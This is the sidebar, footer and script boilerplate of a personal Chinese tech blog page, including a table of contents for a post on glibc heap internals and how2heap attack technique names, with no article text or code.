fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#glibc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">glibc的源码调试配置</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BDglibc%E6%BA%90%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">下载glibc源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%B8%A6%E7%AC%A6%E5%8F%B7%E7%9A%84glibc"><span class="toc-number">1.2.</span> <span class="toc-text">编译带符号的glibc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">源码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E6%A8%A1%E5%9D%97"><span class="toc-number">2.1.</span> <span class="toc-text">内存管理模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E5%AE%8F"><span class="toc-number">2.1.1.</span> <span class="toc-text">相关数据结构与宏</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#malloc-chunk"><span class="toc-number">2.1.1.1.</span> <span class="toc-text">malloc_chunk</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%8F"><span class="toc-number">2.1.1.2.</span> <span class="toc-text">相关的宏</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#chunk%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%8F"><span class="toc-number">2.1.1.2.1.</span> <span class="toc-text">chunk相关的宏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%87%E5%BF%97%E4%BD%8D%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%8F"><span class="toc-number">2.1.1.2.2.</span> <span class="toc-text">标志位相关的宏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Tcache%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%8F"><span class="toc-number">2.1.1.2.3.</span> <span class="toc-text">Tcache相关的宏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E4%BA%9Bbin%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%8F"><span class="toc-number">2.1.1.2.4.</span> <span class="toc-text">一些bin相关的宏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#unlink%E6%93%8D%E4%BD%9C"><span class="toc-number">2.1.1.2.5.</span> <span class="toc-text">unlink操作</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Binmap%E7%9B%B8%E5%85%B3%E7%9A%84%E5%AE%8F"><span class="toc-number">2.1.1.2.6.</span> <span class="toc-text">Binmap相关的宏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Fastbins%E7%9B%B8%E5%85%B3%E5%AE%8F"><span class="toc-number">2.1.1.2.7.</span> <span class="toc-text">Fastbins相关宏</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#malloc-state-%E4%B8%8E-malloc-par"><span class="toc-number">2.1.1.2.8.</span> <span class="toc-text">malloc_state 与 malloc_par</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">代码实现流程分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#malloc"><span class="toc-number">2.1.2.1.</span> <span class="toc-text">malloc</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#libc-malloc%E5%87%BD%E6%95%B0"><span class="toc-number">2.1.2.1.1.</span> <span class="toc-text">__libc_malloc函数</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#int-malloc"><span class="toc-number">2.1.2.1.2.</span> <span class="toc-text">_int_malloc</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%A3%B0%E6%98%8E%E4%B8%8E%E5%88%9D%E5%A7%8B%E5%8C%96%E9%98%B6%E6%AE%B5"><span class="toc-number">2.1.2.1.2.1.</span> <span class="toc-text">声明与初始化阶段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#fastbin%E9%98%B6%E6%AE%B5"><span class="toc-number">2.1.2.1.2.2.</span> <span class="toc-text">fastbin阶段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#smallbin%E9%98%B6%E6%AE%B5"><span class="toc-number">2.1.2.1.2.3.</span> <span class="toc-text">smallbin阶段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#large-bin%E9%98%B6%E6%AE%B5%E4%B8%8Emalloc-consolidate"><span class="toc-number">2.1.2.1.2.4.</span> <span class="toc-text">large bin阶段与malloc_consolidate</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#unsorted-bin%E9%98%B6%E6%AE%B5"><span class="toc-number">2.1.2.1.2.5.</span> <span class="toc-text">unsorted bin阶段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%9C%9F%E6%AD%A3%E7%9A%84large-bin%E6%90%9C%E7%B4%A2%E9%98%B6%E6%AE%B5"><span class="toc-number">2.1.2.1.2.6.</span> <span class="toc-text">真正的large bin搜索阶段</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E8%BF%9B%E4%B8%80%E6%AD%A5%E7%9A%84large-bin%E6%90%9C%E7%B4%A2%E4%B8%8Etop-chunk%E7%8E%AF%E8%8A%82"><span class="toc-number">2.1.2.1.2.7.</span> <span class="toc-text">进一步的large bin搜索与top chunk环节</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.1.2.1.2.8.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#free"><span class="toc-number">2.1.2.2.</span> <span class="toc-text">free</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%80%BB%E7%BB%93-1"><span class="toc-number">2.1.2.2.1.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E6%93%8D%E4%BD%9C"><span class="toc-number">2.1.2.3.</span> <span class="toc-text">初始化操作</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%84%E7%A7%8D%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F-%E9%80%89%E8%87%AAhow2heap%E4%BB%A5%E5%8F%8A%E9%9B%B6%E6%95%A3%E6%95%B4%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">各种攻击方式(选自how2heap以及零散整理)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#decrypt-safe-linking"><span class="toc-number">3.1.</span> <span class="toc-text">decrypt_safe_linking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup"><span class="toc-number">3.2.</span> <span class="toc-text">fastbin_dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-consolidate"><span class="toc-number">3.3.</span> <span class="toc-text">fastbin_dup_consolidate</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-dup-into-stack"><span class="toc-number">3.4.</span> <span class="toc-text">fastbin_dup_into_stack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#fastbin-reverse-into-tcache"><span class="toc-number">3.5.</span> <span class="toc-text">fastbin_reverse_into_tcache</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/08/10/2023%E8%AE%A1%E5%88%92%E8%A1%A8/" title="2023夏季之后计划表与忏悔录"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2023夏季之后计划表与忏悔录"/></a><div class="content"><a class="title" href="/2023/08/10/2023%E8%AE%A1%E5%88%92%E8%A1%A8/" title="2023夏季之后计划表与忏悔录">2023夏季之后计划表与忏悔录</a><time datetime="2023-08-10T08:14:28.000Z" title="Created 2023-08-10 16:14:28">2023-08-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/" title="CVE-2016-9793分析"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2016-9793分析"/></a><div class="content"><a class="title" href="/2023/04/19/CVE-2016-9793%E5%88%86%E6%9E%90/" title="CVE-2016-9793分析">CVE-2016-9793分析</a><time datetime="2023-04-19T08:27:13.000Z" title="Created 2023-04-19 16:27:13">2023-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/17/ucore-lab/" title="ucore-lab"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ucore-lab"/></a><div class="content"><a class="title" href="/2023/04/17/ucore-lab/" title="ucore-lab">ucore-lab</a><time datetime="2023-04-17T07:04:17.000Z" title="Created 2023-04-17 15:04:17">2023-04-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/04/08/QEMU-RUN/" title="QEMU逃逸入门"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="QEMU逃逸入门"/></a><div class="content"><a class="title" href="/2023/04/08/QEMU-RUN/" title="QEMU逃逸入门">QEMU逃逸入门</a><time datetime="2023-04-07T16:09:19.000Z" title="Created 2023-04-08 00:09:19">2023-04-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/" title="libc的源码调试与分析"><img src="https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="libc的源码调试与分析"/></a><div class="content"><a class="title" href="/2023/03/31/libc%E7%9A%84%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E4%B8%8E%E5%88%86%E6%9E%90/" title="libc的源码调试与分析">libc的源码调试与分析</a><time datetime="2023-03-31T08:37:53.000Z" title="Created 2023-03-31 16:37:53">2023-03-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://i.loli.net/2021/10/14/GSfj5BxXTdRqg2o.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Photon</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a><br>
<img src="https://static.dy208.cn/o_1dfilp8ruo521thr1hvf18ji17soa.png">
<a href="https://beian.miit.gov.cn/"  style="color:#f72b07" target="_blank">皖ICP备2022000759号</a></div><div class="footer_custom_text">欢迎来到光子的博客哟(●'◡'●)</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll To Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', { class: 'katex-wrap'})
  })
})()</script><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'J3nDf4qkr8OdRFaP64k2k453-gzGzoHsz',
      appKey: 'NXx6F7OYpwVWFbIQPVnw8HvN',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'en',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>